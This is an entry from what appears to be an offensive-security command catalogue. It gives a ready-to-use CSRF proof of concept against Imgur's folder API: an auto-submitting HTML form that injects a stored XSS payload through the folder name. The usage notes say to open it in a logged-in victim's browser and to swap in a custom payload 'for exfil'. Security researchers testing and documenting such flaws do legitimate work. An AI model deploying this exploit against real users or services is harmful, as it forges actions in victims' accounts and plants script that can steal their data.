---
id: cmd-imgur-csrf-form
data: |-
  <html>
  <body onload='document.forms[0].submit()'>
   <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
   <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
   <input name='is_private' value='false'>
   </form>
  </body>
  </html>
tags:
  - csrf
  - form-submit
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.792Z'
verified: false
validated: true
submitted: true
---
# CSRF HTML Form Submit

## Command

```html
<html>
<body onload='document.forms[0].submit()'>
 <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
 <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
 <input name='is_private' value='false'>
 </form>
</body>
</html>
```

## Description

This HTML snippet creates an auto-submitting form that exploits CSRF to POST a malicious folder name to Imgur's API, injecting an XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| name | Folder name with XSS payload | Yes |
| is_private | Privacy flag (false for accessible) | Yes |
| action | API endpoint URL | Yes |
| method | POST | Yes |
| enctype | application/json | Yes |
| onload | Auto-submit script | Yes |

## Examples

### Basic Usage

Save as .html and open in victim's browser while authenticated.

### Advanced Usage

Modify payload: Change value to custom XSS, e.g., for exfil.

## Expected Output

Silent API call; folder created if successful. Check Imgur favorites for confirmation.

## Related

- [[Related Procedure: CSRF Create Malicious Folder]]
